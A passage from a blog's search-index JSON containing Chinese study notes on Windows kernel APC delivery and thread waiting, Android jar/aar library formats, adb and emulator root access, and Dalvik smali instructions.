首先根据等待块里的Object字段，找到被等待对象Event，根据Event结构，它只包含一个_DISPATCHER_HEADER结构，虽然我可以直接看该结构里的字段；在位于0x8处，有一个WaitListHead字段，这是一个链表，该链表指向的就是当前被等待对象Event对应的等待块（若包含多个等待块，则将这些等待块依次插入链表中）。这样线程，等待块，被等待对象之间的关系就理清了。 一个线程等待多个对象的情况可以参考下图： 等待网 如图，这是海哥根据等待关系构造的一张等待网，所有处于等待状态的线程，线程对应的等待块，以及被等待对象，都会位于类似的等待网上。 总结 等待中的线程，一定在等待链表中（KiWaitListHead），同时也一定位于等待网上（即KThread+5C的位置不为空）。 线程通过调用WaitForSingleObject或WaitForMultipleObjects函数将自己挂到等待网上（Sleep函数也可以，处理过程不太一样）。 线程什么时候会再次执行取决于其他线程何时调用相关函数，等待对象不同调用的函数也不同。 参考资料参考课程： 滴水中级预习班课程 参考链接： https://blog.csdn.net/qq_41988448/article/details/104626764 （CSDN-lzyddf学习笔记） https://blog.csdn.net/weixin_42052102/article/details/83388129 （CSDN-My classmates学习笔记）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"临界区&自旋锁","slug":"临界区与自旋锁","date":"2020-08-11T06:31:57.000Z","updated":"2022-05-17T15:17:47.208Z","comments":true,"path":"2020/08/11/临界区与自旋锁/","link":"","permalink":"http://cata1oc.github.io/2020/08/11/%E4%B8%B4%E7%95%8C%E5%8C%BA%E4%B8%8E%E8%87%AA%E6%97%8B%E9%94%81/","excerpt":"","text":"前言本篇开始，进行同步章节的知识点学习，主要内容包括Windows的种种同步机制，包括自旋锁、临界区、事件、互斥体等。由于在驱动章节末篇，已经学习过一遍多核同步的部分内容（临界区、自旋锁），这里就不再重复，仅作重定位。 多核同步之临界区多核同步之自旋锁","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"用户APC执行过程","slug":"用户APC执行过程","date":"2020-08-10T06:47:52.000Z","updated":"2022-05-17T15:17:18.689Z","comments":true,"path":"2020/08/10/用户APC执行过程/","link":"","permalink":"http://cata1oc.github.io/2020/08/10/%E7%94%A8%E6%88%B7APC%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B/","excerpt":"","text":"前言在前一篇分析了内核APC执行过程，本篇开始分析用户APC执行过程，处理用户APC要比内核APC复杂的多，因为，用户APC函数要在用户空间执行，涉及到大量换栈的操作： 当线程从用户层进入内核层时，要保留原来的运行环境，比如各种寄存器，栈的位置等等（_Trap_Frame），然后切换成内核的堆栈，如果正常返回，恢复堆栈环境即可。 但如果有用户APC要执行的话，就意味着线程要提前返回到用户空间去执行，而且返回的位置不是线程进入内核时的位置，而是返回到其它的位置，每处理一个用户APC都会涉及到：内核 -> 用户空间 -> 再回到内核空间。 这一过程非常复杂，需要了解堆栈的操作细节，这里，我们先从KiDeliverApc开始，一步步分析。 KiDeliverApc 回到上次KiDeliverApc的位置，橙色框住的部分，会判断内核APC队列是否存在需要处理的APC；接着下方就是判断用户APC队列是否存在需要处理的APC，判断方法与内核APC一样，若队列不为空，则会跳转处理用户APC。根据代码的流程也可以看出，系统在处理用户APC之前，一定会先处理内核APC。 跳转进来，首先，橙色框住的部分，是一些先行校验（处理内核APC部分也有，但校验的参数不同），若校验不通过，则无法继续执行，将会离开KiDeliverApc函数。其中一个校验的是KiDeliverApc的参数PreviousMode，判断该值是否为1。若不为1，则无法继续执行。先前的文章有分析过，线程发生切换时会调用KiDeliverApc，此时PreviousMode的值必然为0，所以线程切换时用户APC没法得到执行。 然后来看绿色框住的地方，这部分就比较熟悉了，和处理内核APC过程类似。先将处理APC要用到的参数存储到局部变量，接着摘除APC块，释放Kapc结构，然后校验参数NormalRoutine。 接着就是与内核APC处理不同的地方了，处理内核APC会直接调用NormalRoutine；而处理用户APC会依次将需要用到的4个参数以及KiDeliverApc函数还未使用到的2个参数全部压入堆栈，并调用KiInitializeUserApc函数。这个函数是处理用户APC的关键，它用来初始化处理用户APC的环境。具体看接下来的分析。 KiInitializeUserApc线程进0环时，原来的运行环境（Ring3.ESP，Ring3.EIP等）保存到_Trap_Frame结构体中，如果要提前返回3环去处理用户APC，就必须要修改TrapFrame结构体。 原先进0环时的位置存储在_Trap_Frame的EIP中，现在要提前返回，而且返回的并不是原来的位置（原来的位置并不能执行用户APC函数），那就意味着必须要修改EIP为新的返回位置。ESP也要修改为处理APC所需要的堆栈。那么原来的值怎么办呢？处理完APC后该如何返回原来的位置呢？ 所以KiInitializeUserApc要做的第一件事就是备份：将原来_Trap_Frame的值备份到一个新的结构体中（Context），这个功能由其子函数KeContextFromKframes来完成。下面来看KiInitializeUserApc如何实现这一过程： 先看这一部分，关键的部分都框出来了，下面一个个来看。 橙色方框：KiDeliverApc有3个参数，其中之一就是_Trap_Frame，并作为KiInitializeUserApc的参数，传进来。 红色方框1&2：这部分将_Trap_Frame的内容备份到Context，Context结构和TrapFrame类似。 需要注意的是，这部分将TrapFrame的值备份到了Ring0堆栈中的Context。 绿色方框：这部分是开辟Ring3的栈空间，首先可以根据_Trap_Frame获取到原先Ring3环境下的ESP，但是此时的ESP无法用来执行用户APC，所以需要开辟新的大小为0x2DC的内存空间。这个0x2DC，能刚好容纳下Context结构体（大小0x2CC）+ 4个执行用户APC需要用到的参数（大小0x10） 红色方框3：这部分，将前面在Ring0堆栈中的Context结构体的内容复制到Ring3堆栈中（刚刚开辟的内存空间） 紫色方框：当原先TrapFrame的值已经备份到Context中以后，就可以修改_Trap_Frame的值了，这部分主要是修改段寄存器的值。 接着来看这一部分： 紫色方框1：紧接着上面那部分，这里是修改_Trap_Frame中Eflags的值。 紫色方框2：这里修改_Trap_Frame中的ESP，EIP以及ErrCode。其中 ESP：建立在原先ESP基础上有新增的0x2DC大小的空间，并且此时新增区域已经赋上了Context结构体，还余有0x10大小的空间。 EIP：EIP是返回3环后开始执行的位置，前言中提到，返回3环的位置不是线程进入内核时的位置，而是返回到其它的位置。说的就是这里，这里将EIP的值修改为KeUserApcDispatcher函数的地址，该函数是属于ntdll.dll的一个3环函数，也是所有用户APC执行时返回到3环的位置。这样就可以保证了用户APC返回3环后都会从这里开始执行。 红色方框：先前开辟内存空间时，开辟了0x2DC个字节，用来存放Context结构体和4个执行APC时需要用到的参数。方才上一部分分析中已经将Context结构体复制到3环的这一块区域中，这里则是将4个参数复制进来。由于Ring.ESP的值已经确定，并且此时执行时仍位于0环堆栈，只是在0环堆栈中操作3环堆栈的内存空间，因此不能才用push，而是用上述这种方法复制值。 上述操作完后，Ring3的堆栈分配大致如下 然后，根据_Trap_Frame内的值，就可以返回到3环，从KiUserApcDispatcher函数开始执行。 KiUserApcDispatcher 这部分就不那么困难了，只有几行代码。先看橙色方框，这里是调用堆栈栈顶的函数，需要注意一点，由于KiUserApcDispatcher是3环函数，在执行此函数时，环境应是3环堆栈，因此，可以根据上方的3环堆栈图可以得知此时调用的函数是NormalRoutine。 先前在介绍Kapc结构时提到过，如果是内核APC，NormalRoutine就是内核APC函数；如果是用户APC，NormalRoutine表示的是用户APC的总入口。那么这个入口是什么呢？当用户在3环调用QueueUserApc函数来插入APC时，不需要提供NormalRoutine，这个参数是在QueueUserApc内部指定的BaseDispatchApc。通过这个入口，内部会调用真正的用户APC函数执行。至此，用户APC函数已成功执行。 再接下来，前言提到过，用户APC是在3环执行的，因此还需要返回内核，观察红色方框，ZwContinue做的就是这件事，用来返回内核，此处就不再继续分析该函数。返回内核后，如果还有用户APC，则重复之前的执行过程。如果没有需要执行的用户APC，会将Context赋值给_Trap_Frame结构体。就像从来没有修改过一样。ZwContinue后面的代码不会执行，线程从哪里进的3环，就回到哪里去。至此，整个用户APC执行过程结束。 小技巧这里有个小技巧，由于ZwContinue执行时会将Context的值赋值给_Trap_Frame结构体，因此只要修改Context结构体存的EIP的值，就可以控制内核在处理完内核APC和用户APC之后返回3环的位置了。返回到自己写的代码段，当然执行起来并不容易，但也算是一种不错的思路。 总结 内核APC在线程切换时执行，不需要换栈，比较简单，一个循环执行完毕。 用户APC在系统调用、中断或异常返回3环前会进行判断，如果有要执行的用户APC，再执行 用户APC执行前会先执行内核APC 参考资料课程： 滴水海哥中级预习班 链接： https://blog.csdn.net/weixin_42052102/article/details/83348780 （CSDN-My classmates笔记） https://www.cnblogs.com/DeeLMind/p/6855085.html （博客园-Context结构体） https://blog.csdn.net/jn1158359135/article/details/7761011 （CSDN-Eflags寄存器）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"Android文件格式：库文件","slug":"常见Android文件格式1","date":"2020-08-09T12:08:52.000Z","updated":"2022-05-17T15:16:50.822Z","comments":true,"path":"2020/08/09/常见Android文件格式1/","link":"","permalink":"http://cata1oc.github.io/2020/08/09/%E5%B8%B8%E8%A7%81Android%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F1/","excerpt":"","text":"前言Android系统中最常见的文件应属APK安装包。在开发与逆向分析APK程序时，会涉及APK安装包内部其它文件的结构，了解了这些结构后，在逆向分析的过程中能更好的作出判断。本篇从Android库文件开始，通过学习《Android软件安全权威指南》上的内容，将会陆续更新常见的Android文件格式，以了解它们在系统中加载与处理方面的细节。 库文件基本含义：库文件是一系列代码功能接口与资源数据的有机结合。 实际意义：Android SDK是大量库文件的结合。 种类：第三方提供的地理位置SDK，数据统计SDK，广告SDK等都是库文件。 jar包历史因素在Android Studio之前的时代，Android软件主要由ADT(工具包) + Eclipse(IDE)开发，所以库文件使用Java语言中标准的jar包（Java Archive）。jar包其实是一个zip格式的压缩包文件，存放着Java代码编译后的class文件的集合。因此，常称jar文件为jar包。 android.jarandroid.jar是相对重要的一个库文件，在开发兼容不同版本系统的APK时，要引用Android SDK中不同版本的android.jar文件，它也是开发中使用最多的库。接下来查看android.jar的格式及部分内容： 首先需要配置一个可以执行bash指令的虚拟机，为了方便，可使用Bash on Ubuntu，这部分可参考zlmm741的文章进行配置。 然后找到android.jar文件，定位到SDK目录，进入platforms目录后，任选一个版本的文件夹进入，就可以看到android.jar文件，参考下图 将其复制到桌面，通过如下指令查看其格式及内容 bash12$ file android.jar$ unzip -l android.jar | less 可以看到jar是一个zip包，它有一个META-INF目录，一些对安全性要求较高的jar包，会对其包含的class文件进行签名，并将签名信息保存在这个目录下。 分析手法分析jar包，有静态分析和动态分析两种方法，这里作简要概括。 静态分析：可使用jd-gui这类jar查看工具，其内部会调用反编译接口，将jar包中的class文件编译成Java文件，对于分析人员来说可以大幅提高代码可读性。根据不同平台从这里下载对应的发行版。使用效果如下： 动态分析：在Android平台上进行动态分析时，可以参考PC上的方案，如AspectJ的面向切片编程技术（AOP）。AspectJ提供了对jar包中方法的侵入式Hook技术，可通过编写AspectJ脚本来Hook jar包中的方法。Android平台上有AspectJ的移植版本，只需编写Hook实例，并结合相应的分析技术，即可对jar包的行为进行分析。 aar包新的库文件格式jar包有一个明显的不足，它通常只包含其所使用的代码，不包含代码所使用的资源数据；如果第三方SDK使用了大量的图片、声音、布局等资源，除了需要将jar包引用到工程中，还需要将SDK中的资源手动复制到工程中；这必然会导致资源数据过多，难以分辨，影响开发效率。 随着Android Studio的问世，将aar文件作为全新的库文件格式。它除了可以包含代码，还可以包含任何在开发中使用的资源数据。 编写aar库接下来通过Android Studio编写一个arr库： 新建一个APK空壳工程，将其命名为”MyAar”。 由于Android Studio不允许直接创建aar文件，所以需要通过模块的形式在已经存在的APK工程中添加aar文件，这里选择在右侧空白处右键选择”New” -> “Module”，然后选择”Android Library”。输入名称”MyLib”，完成创建。 完成后左侧栏显示如下。 此时工程中包含app和mylib两个模块了。不对其进行修改，在Android Studio终端上编译其Release版本。使用如下命令： Code1gradlew :mylib:aR 编译成功后可以在”MyAar\\mylib\\build\\outputs\\aar”处找到mylib-release.aar文件。 aar文件结构下面来看一下aar的文件结构，切换到Ubuntu终端（我的Android Studio位于Windows系统中，遂需要切换进行演示） 可以看到aar文件也是zip包，它的目录结构与APK文件类似： classes.jar包含arr库文件中所有代码生成后的class文件。 res目录中存放了所有的资源。 AndroidManifest.xml文件，用于定义aar包的名称、编译器的版本等。 还有一些本文件并不存在，但也相当重要的目录，例如存放AIDL接口文件的aidl目录；存放Asset资源的assets目录；存放了编译好的不同版本的so库的jni目录；存放aar包引用的第三方jar包的libs目录等。 参考资料 《Android软件安全权威指南》—— 丰生强 https://blog.csdn.net/zlmm741/article/details/104640245 （CSDN-zlmm741学习笔记） https://blog.csdn.net/zlmm741/article/details/104577290 （Bash on Ubuntu on Windows配置） https://blog.csdn.net/zizidemenghanxiao/article/details/50041185?utm_source=blogxgwz7 （Android SDK目录结构） https://zhidao.baidu.com/question/1577372121056020580.html （Linux/mnt目录主要用于什么） http://java-decompiler.github.io/ （jd-gui下载网址）","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"http://cata1oc.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"内核APC执行过程","slug":"内核APC执行过程","date":"2020-08-08T15:43:08.000Z","updated":"2022-05-17T15:16:17.374Z","comments":true,"path":"2020/08/08/内核APC执行过程/","link":"","permalink":"http://cata1oc.github.io/2020/08/08/%E5%86%85%E6%A0%B8APC%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B/","excerpt":"","text":"前言前一篇介绍了APC会在何时被执行，内核APC会在线程切换时执行，用户APC会在0环返回3环时执行。无论是内核APC还是用户APC最终都会被函数KiDeliverApc处理，区别在于传入的参数不同。本篇从内核APC执行的角度来分析一下KiDeliverApc函数。 KiDeliverApc函数原型在分析KiDeliverApc函数前，先来看函数原型 Code1234VOID KiDeliverApc ( IN KPROCESSOR_MODE PreviousMode, IN PKEXCEPTION_FRAME ExceptionFrame, IN PKTRAP_FRAME TrapFrame) 函数参数： PreviousMode：先前模式；值为0时，仅处理内核APC，值为1时，先处理内核APC再处理用户APC。 ExceptionFrame：异常结构。 TrapFrame：陷阱帧，在API函数调用过程的分析中，了解到这是3环进0环时保存现场用到的结构。 函数分析part1 这里把KiDeliverApc分为3个方框来看。首先是准备工作，包括分配栈空间，保存现场，获取当前线程，获取TrapFrame等基本操作；接下来，上锁，进入原子操作。 再来看用红色方框框住的部分，这里有着比较关键的处理逻辑。先将KernelApcPending的值置为0，意味着要开始处理内核APC了，然后再去取位于ApcState结构内核APC队列上的内核Kapc块，这时会做一个判断，比较当前地址与内核APC队列上存着的值是否相同，之所以这样比较的原因是，微软在设计链表时，链表为空时不会存储空，而是存当前链表的地址。这样若相同，意味着内核APC队列为空，否则说明有待处理的内核APC。 然后进入到一个跳转，若判断出存在待处理的内核APC，则会进入跳转，否则将会继续执行，进入到用户APC的处理范畴。 part2 这部分代码核心逻辑主要有3个部分，先看橙色方框的部分，当取到KAPC结构体后，会先跳到这里来。这部分的一个操作是将KAPC-0xC处的地址，赋值给edi寄存器，为何要这么做呢？因为KAPC结构体不是以首地址的形式挂在ApcState的APC队列上的，而是挂在0xC偏移处，因此当取到KAPC结构体后，需要减去这段偏移，才能获取到KAPC的首地址。 有了KAPC后，可以获得NormalRoutine这个字段的值，在APC挂入过程中提到过这个字段的含义：若是内核APC，它就是真正的内核APC函数；若是用户APC，则是用户APC的总入口。搞清楚这个逻辑后，就可以看红框的这个判断和跳转了。如果NormalRoutine的值不为0，则跳转，继续看part3的分析。如果不为0，说明该内核APC没有内核APC函数，会向下继续执行到绿框，可以看到，这里会跳转回去，继续判断内核APC队列中是否有下一个APC。 part3 先看橙色框住的部分，刚开始会先有两个判断，第一个判断当前线程KernelApcInProgress字段的值，看是否有别的内核APC处于进程中正在执行，若有，就跳转离开；否则将会进入到第二个判断，判断当前线程的KernelApcDisable字段的值，判断当前线程是否禁用了内核APC，若被禁用，同样跳转离开；否则继续执行。 当两个判断都通过的时候，下一步先从内核APC队列中摘除当前KAPC块。然后调用KernelRoutine函数释放KAPC结构体占用的空间。 再往下看，可以看到红色框住的部分，通过call指令调用了NormalRoutine函数并完成执行，这个函数就是真正的APC中的内核函数。至此，KiDeliverApc完成对内核APC的执行。也可以验证结论，在内核APC中，NormalRoutine就是真正的内核APC函数。执行完后，通过跳转指令，继续判断内核APC队列中是否有下一个APC。 执行流程在KiDeliverApc函数中，具体的执行流程可以参考下图： 参考资料 滴水中级预习班 https://blog.csdn.net/qq_41988448/article/details/104240902 （CSDN lzyddf笔记） https://blog.csdn.net/qq_38474570/article/details/104326170 （CSDN 鬼手笔记） https://blog.csdn.net/weixin_42052102/article/details/83339412 （CSDN My classmates笔记）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"APC执行时机","slug":"Apc执行时机","date":"2020-08-07T06:16:52.000Z","updated":"2022-05-17T15:15:46.479Z","comments":true,"path":"2020/08/07/Apc执行时机/","link":"","permalink":"http://cata1oc.github.io/2020/08/07/Apc%E6%89%A7%E8%A1%8C%E6%97%B6%E6%9C%BA/","excerpt":"","text":"前言在学习了APC挂入过程后，按顺序接下来就该探究APC的执行过程了，但是在这之前，还需要了解一件事，就是APC何时执行。 内核APC执行时机了解完APC执行时机，才能跟进探究APC的执行过程，本篇先从内核APC开始。 SwapContext首先观察SwapContext函数，之前的文章分析SwapContext曾分析过这个函数，但那次主要是分析函数的整体执行流程，仍有细节被忽视。 位于SwapContext最后的部分，有一个判断，会判断当前线程的KernelApcPending字段的值是否为0。在APC的本质这一篇中提到过，该字段表示是否有正在等待执行的内核APC。观察绿色方框框住的不同情况的结果： 若有等待执行的内核APC，则发生跳转，并将eax低8位的值，修改为1 若无等待执行的内核APC，会修改eax的值为0 可以发现，有无待执行的内核APC，影响的值是eax，而eax，通常作为返回值而存在。所以向上分析，看是谁调用了SwapContext，谁就会用到eax。 可以看到，上一层调用SwapContext函数的是KiSwapContext KiSwapContext 观察KiSwapContext，可以看到，它在调用了SwapContext后并没有使用到eax的值，就返回了，因此还需要再往上看一层，看哪个函数调用了KiSwapContext，由图，可以得到KiSwapThread。 KiSwapThread 定位到调用KiSwapContext的位置，在执行完后，对返回值eax做了一次判断（test指令即对eax作与运算）；若此时eax的值不为0（即有等待执行的内核APC），则会进行跳转，并在接下来调用KiDeliverApc函数。KiDeliverApc函数，就是用来执行APC的函数。 KiDeliverApc函数既可以处理内核APC又可以处理用户APC，具体情况取决于其第一个参数。当第一个参数值为0时，仅处理内核APC；当第一个参数值为1时，先处理内核APC，再处理用户APC。所以，在任何情况下，都会优先处理内核APC，因而可以得出结论，当发生线程切换（SwapContext）的时候，内核APC会被执行。 继续分析图中代码，在执行KiDeliverApc函数之前，eax会先被清零，这意味着，此处调用KiDeliverApc，仅会处理内核APC。那么用户APC何时得到机会执行呢？接着往下看。 用户APC执行时机在线程切换时，内核APC得到执行的机会，但是用户APC却不行。下面来看一个函数KiServiceExit。 观察红框框住的部分，这里有一个判断，和SwapContext类似，这里会判断当前线程的UserApcPending的值是否为0，即判断是否有等待执行的用户APC。若值为0，说明不存待执行的用户APC，跳转离开。否则，继续执行，就可以执行到前面提到的KiDeliverApc函数。此时可以看到，第一个参数被固定为1，即先处理内核APC再处理用户APC。这里即为用户APC的执行点。 当0环返回3环时，KiServiceExit函数会被调用，此时便会执行用户APC。 参考资料 滴水3期中级预习班","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"adb&Root","slug":"adb与Root","date":"2020-08-06T08:06:54.000Z","updated":"2022-05-17T15:14:56.949Z","comments":true,"path":"2020/08/06/adb与Root/","link":"","permalink":"http://cata1oc.github.io/2020/08/06/adb%E4%B8%8ERoot/","excerpt":"","text":"Android调试桥(adb)什么是Android调试桥Android调试桥（adb）是一种功能多样的命令行工具，可让客户端（例如PC）与设备（真实机/Android虚拟机）进行通信。adb命令可作用于执行各种设备操作（例如安装和调试应用），并提供对Unix shell的访问权限（可进入root模式）。它是一种客户端-服务器程序，包括以下三个组件： 客户端：用于发送命令。客户端在开发计算机上运行。可以通过发出adb命令来从命令行终端调用客户端。 守护进程(adbd)：在设备上运行命令。守护进程在每个设备上作为后台进程运行。 服务器：管理客户端和守护进程之间的通信。服务器在开发机器上（Android模拟器/真机）作为后台进程运行。 adb包含在Android SDK中，在Windows系统中，通过Android Studio安装SDK后，可以根据其位置找到SDK对应的文件夹 通常位于 Code1%UserProfile%\\AppData\\Local\\Android\\Sdk 接着进入该目录下的platform-tools目录，即可找到adb 修改Windows环境变量，将adb所在路径添加到系统变量Path中，如下图 即可在命令行中，使用adb相关的命令了。 adb工作原理当启动某个adb客户端时，该客户端会先检查是否有adb服务器进程正在运行。如果没有，它会启动服务器进程。服务器在启动后会与本地TCP端口5037绑定，并监听adb客户端发出的命令 - 所有adb客户端均通过端口5037与adb服务器通信。 然后，服务器会与所有正在运行的设备建立连接。它通过扫描5555~5585之间（该范围供前16个模拟器使用）的奇数号端口查找模拟器。服务器一旦发现adb守护程序（adbd），便会与相应的端口建立连接。注意，每个模拟器都使用一对按顺序排列的端口 - 用于控制台连接的偶数号端口和用于adb连接的奇数号端口。例如： Code12345模拟器1，控制台：5554模拟器1，adb：5555模拟器2，控制台：5556模拟器2，adb：5557依此类推 如上所示，在端口5555处与adb连接的模拟器和控制台监听端口为5554的模拟器是同一个。 观察下图，在没有开启安卓模拟器时，使用设备查询命令并未找到设备，两个端口也均无状态。 然后运行安卓模拟器（这里使用Android Studio自带的模拟器），再输入之前的命令，观察结果 可以看到设备列表（说明adb服务器已先启动），并且也可以检测到两个端口的状态，这说明服务器已与设备建立了连接，接下来便可以通过adb命令访问这些设备。 常用adb命令下面简要介绍几个常用的adb命令，详细内容可参考官方文档 Codecommand123456789101112131415161718192021222324252627281. 命令：adb devices 作用：显示已连接设备2. 命令：adb install path_to_apk 参数：-t 作用：在模拟器上安装APK3. 命令：adb forward tcp:6100 tcp:7100 作用：设置端口转发 示例含义：设置了主机端口6100到设备端口7100的转发 4. 命令：adb pull remote local 作用：从设备(remote)中复制某个文件或目录到主机(local)5. 命令：adb push local remote 作用：将某个文件或目录从主机(local)复制到设备(remote) 6. 命令：adb kill-server 作用：停止adb服务器7. 命令：adb start-server 作用：启动adb服务器8. 命令：adb shell shell_command 作用：通过adb向设备发出shell命令对设备进行操作 9. 命令：adb shell 作用：在设备上启动交互式shell(exit/Ctrl+D退出) 以上为常用adb命令，shell命令不在此扩展，在用到时会在作说明。 Root什么是RootRoot，也称为根用户，是Unix，类Unix系统，Android及iOS移动设备系统中的唯一超级用户，拥有至高无上的权限。若想通过adb shell进入系统目录中查看，修改文件，就必须要有Root权限。 Android Studio模拟器的Root权限键入adb shell指令，会出现两种情况： Code1@generic_x86:/ $ 这种情况说明此时不是root身份，如果显示为： Code1root@generic_x86:/ # 说明此时已经以root身份运行，可以对模拟器进一步操作。 若没有获取root全选，则可以使用命令adb root进入root模式 观察上图，第一次进入adb shell后，因没有root权限，而无权查看/data目录下的，在使用命令adb root后，却仍然无权限查看。原因在于Android7.0的模拟器是没有root权限的，需要重新装一个低版本的模拟器。 当重新使用一个低版本的Android模拟器时，便解决了之前的问题 可以看到，切到adb shell中，已是root身份，也拥有访问文件的权限。 配置夜神模拟器Android Studio的官方模拟器有诸多限制，大部分市场上的应用程序很不方便安装，也就不便于调试；夜神模拟器，原本是用于电脑运行移动端游戏的模拟器，其采用Android系统，且能下载很多常用软件，对于研究Android逆向和底层方便许多。 版本同步首先，我们需要配置adb用来操作夜神模拟器。 可以看到，adb服务器的版本与客户端的版本不匹配，因而无法正常使用adb命令。所以这里需要手动进行adb版本同步的工作： 第一步，将夜神模拟器原先的adb配置文件进行备份 第二步，将所使用版本的adb配置文件（位于Android sdk文件夹下）替换夜神模拟器中的 第三步，将原先夜神模拟器的adb启动文件备份 ，这里的adb启动文件则是夜神模拟器每次启动时使用的，更改它的名字，并用刚刚从Android sdk中复制过来的adb启动文件替换它 上述工作完成，重启夜神模拟器，并在命令行中打印设备，就不会出现版本不匹配的问题了 卸载测试版本匹配后，来做个简单的测试，先下载QQ 然后再通过命令把它卸载掉 由图很顺利的完成了测试，现在，就可以用夜神模拟器进行接下来的实验了。 Dalvik指令练习前一章学习了Dalvik指令，但是没有练习，现在学习使用夜神模拟器后，就可以进行了。 编写dalvik指令集代码第一步，在文件夹中新建一个txt文件，用smali语法编写一段Dalvik指令集代码 Code12345678910.class public LHelloWorld; #定义类名.super Ljava/lang/Object; #定义父类.method public static main([Ljava/lang/String; )V #声明静态main()方法 .registers 4 #程序使用4个寄存器 .prologue #代码起始指令 sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream; const-string v1, \"Hello World\" invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V return-void #返回空值.end method 并将代码拷贝一份，保存为.smali后缀的形式 编译smali文件在看雪工具库中下载smali/baksmali，解压后分别得到smali-2.4.0.jar和baksmali-2.4.0.jar，将smali-2.4.0.jar重命名为smali.jar后，复制到当前文件夹下 执行命令 dos1java -jar smali.jar a -o hello.dex hello.smali 会在当前文件夹下生成以.dex结尾的文件，这个文件，便可以运行在Android设备上，接下来通过虚拟机完成这个步骤。 运行dex文件夜神模拟器还是开着的，之前也已经配置好了，现在就要拿来用了。 先执行设备查询命令查看已经附加的设备 确认设备后，执行以下命令 Code1adb push hello.dex /sdcard/ 将我们的编译生成的.dex文件push进入夜神模拟器根目录下的/sdcard/目录下 最终运行这个dex文件，还需要用到dalvikvm，可使用adb shell dalvikvm -h命令查看帮助文档。这里需要用到参数-cp指定执行文件所在路径，并在后续参数中指定要执行的类。 完整指令如下： Code1adb shell dalvikvm -cp /sdcard/hello.dex HelloWorld 执行结果，打印出HelloWorld，这便是我们用dalvik指令集实现的功能。指令中最后一个参数是HelloWorld而不是hello，前面也有提到，类的名字是HelloWorld，执行dex文件时需指定要执行的类，因此为类名而不是文件名。 参考链接 https://developer.android.google.cn/studio/command-line/adb?hl=zh-cn （Android调试桥官方文档） https://www.jianshu.com/p/d5f42f0320c2 （Android Studio模拟器的root权限） https://jingyan.baidu.com/article/19192ad86494bfa53e5707b3.html （如何使用adb操作夜神模拟器） https://docs.oracle.com/javase/8/docs/api/?xd_co_f=10a3e809-6a01-4da1-a263-23a78e6e10ac （Java8文档：Class System） https://docs.oracle.com/javase/8/docs/api/java/io/PrintStream.html （Java8文档：Class PrintStream） https://www.ucloud.cn/yun/14011.html （用Smali手写一个可运行的HelloWorld）","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"http://cata1oc.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"Dalvik指令集","slug":"Dalvik指令集","date":"2020-07-24T06:44:07.000Z","updated":"2022-05-17T15:13:36.522Z","comments":true,"path":"2020/07/24/Dalvik指令集/","link":"","permalink":"http://cata1oc.github.io/2020/07/24/Dalvik%E6%8C%87%E4%BB%A4%E9%9B%86/","excerpt":"","text":"前言在前一篇中，学习了Dalvik可执行指令格式，对Dalvik指令有个大概的认识，本篇就在此基础上，学习并整理Dalvik指令集相关内容。 自Android 4.4以来，可以在Android的源码文件art/runtime/dexinstructionlist.h中找到系统支持的完整的指令集定义。可以参考此链接（Android 6.0.0_r5源码文件中指令集的定义）。从中可以发现，Dalvik指令集使用了单字节的指令助记符。 Dalvik指令类型Dalvik指令在调用格式上模仿了C语言的调用约定，指令的语法与助记符有如下特点： 参数采用从目标（destination）到源（source）的方式。 32位常规类型的字节码未添加任何后缀。 64位常规类型的字节码添加 -wide 后缀。 对特殊类型的字节码，根据具体类型添加后缀，可以是 -boolean、-byte、-char、-short、-int、-long、-float、-double、-object、-string、-class、-void 中的一个。 根据字节码布局与选项的不同，为一些字节码添加了字节码后缀以消除歧义。这些后缀通过在字节码主名称添加斜杠来分隔。 在指令集的描述中，宽度值中的每个字母都表示4位的宽度。 来看下面一个例子： Code1move-wide/from16 vAA, vBBBB move：基础字节码（base opcode），表示这是一个基本操作。 -wide：名称后缀（name suffix），表示指令操作的数据宽度（64位）。 from16：字节码后缀（opcode suffix），表示源为一个16位的寄存器引用变量。 vAA：目的寄存器，始终在源的前面，取值范围v0~v255。 vBBBB：源寄存器，取值范围，v0~v65535。 Dalvik指令集中的大多数指令都使用寄存器作为目的操作数或源操作数，其中寄存器的表示有如下含义： A、B、C、D、E、F、G、H 代表4位的数值，可用于表示数值 0~15 或寄存器 v0~v15。 AA、BB、CC、DD、EE、FF、GG、HH 代表8位的数值，可用于表示 0~255 或寄存器 v0~255。 AAAA、BBBB、CCCC、DDDD、EEEE、FFFF、GGGG、HHHH 代表16位的数值，可用于表示 0~63335 或寄存器 v0~v65535。 以上是指令类型的一些说明，下面将会介绍具体操作对应的Dalvik指令。 Dalvik常用指令空操作指令Code123指令：nop对应的值：00作用：通常用于对齐代码，不进行实际操作。 数据操作指令Code123456789101112131415161718指令：move原型：move destination, source指令后缀：根据字节码大小与类型的不同，后缀也有所不同示例：move vA, vB //将vB寄存器的值赋予vA寄存器，源寄存器与目的寄存器都为4位。move/from16 vAA, vBBBB //将vBBBB寄存器的值赋予vAA寄存器，源寄存器为16位，目的寄存器为8位move/16 vAAAA, vBBBB //将vBBBB寄存器的值赋予vAAAA寄存器，源寄存器、目的寄存器均为16位move-wide vA, vB //为4位的寄存器对赋值，源寄存器与目的寄存器都为4位move-wide/from16 vAA, vBBBB //用于使move-wide相同（这里没搞明白是啥意思）move-object vA, vB //为对象赋值，源寄存器和目的寄存器均为4位move-object/from16 vAA, vBBBB 